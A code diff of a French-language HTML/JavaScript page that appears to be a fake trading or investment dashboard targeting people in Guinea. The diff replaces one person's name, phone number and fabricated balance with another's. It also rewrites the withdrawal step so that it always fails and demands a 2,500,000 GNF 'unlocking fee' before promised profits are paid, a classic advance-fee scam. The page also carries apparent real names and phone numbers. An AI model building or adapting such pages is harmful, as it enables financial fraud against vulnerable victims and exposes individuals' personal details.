@@ -230,11 +230,11 @@
 
 <body>
     <script>
-        let code = prompt("Veuillez entrer le code d'accès :");
-        if (code === "620632035") {
+        let code = prompt("Veuillez entrer votre numéro de téléphone :");
+        if (code === "622904170") {
             document.body.style.display = 'block';
         } else {
-            alert("Code incorrect. Accès refusé.");
+            alert("Numéro incorrect. Accès refusé.");
             document.body.style.display = 'none';
         }
     </script>
@@ -245,10 +245,10 @@
         </div>
         <nav>
             <div class="actions">
-                <span class="balance">Solde: 6 500 000 GNF</span>
+                <span class="balance">Solde: 8 300 000 GNF</span>
                 <div class="account-info">
-                    <span id="user-name">CAMPEL ABDOULAYE</span><br>
-                    <span id="user-phone">+224 620 63 20 35</span>
+                    <span id="user-name">MAMADOU OURY</span><br>
+                    <span id="user-phone">+224 622 90 41 70</span>
                 </div>
                 <button id="whatsapp-button">Contact WhatsApp</button>
                 <button id="logout-button">Déconnexion</button>
@@ -310,9 +310,9 @@
             setInterval(updatePrice, 5000);
 
             const setWithdrawalInfo = (method) => {
-                const accountName = "CAMPEL ABDOULAYE";
-                const accountNumber = "224 620 63 20 35";
-                const balance = "6 500 000 GNF";
+                const accountName = "MAMADOU OURY";
+                const accountNumber = "224 622 90 41 70";
+                const balance = "8 300 000 GNF";
                 withdrawalInfo.innerHTML = `${accountName}<br>${accountNumber}<br>${balance}<br>via ${method}`;
                 withdrawalForm.style.display = 'flex';
             };
@@ -332,10 +332,10 @@
             });
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                alert('Cher CAMPEL, veuillez recharger votre compte afin de justifier que ce dernier es actif afin de recevoir vos bénéfices imédiatement.');
+                alert('Cher MAMADOU, veuillez les frais de déblocage de 2 500 000 GNF afin de recevoir vos bénéfices dans les 5 minutes.');
                 withdrawalForm.style.display = 'none';
                 errorMessage.style.display = 'block';
-                errorMessage.textContent = 'Erreur : Compte inactif.';
+                errorMessage.textContent = 'Erreur : Frais de déblocage néccéssaire.';
             });
 
             document.getElementById('whatsapp-button').addEventListener('click', () => {
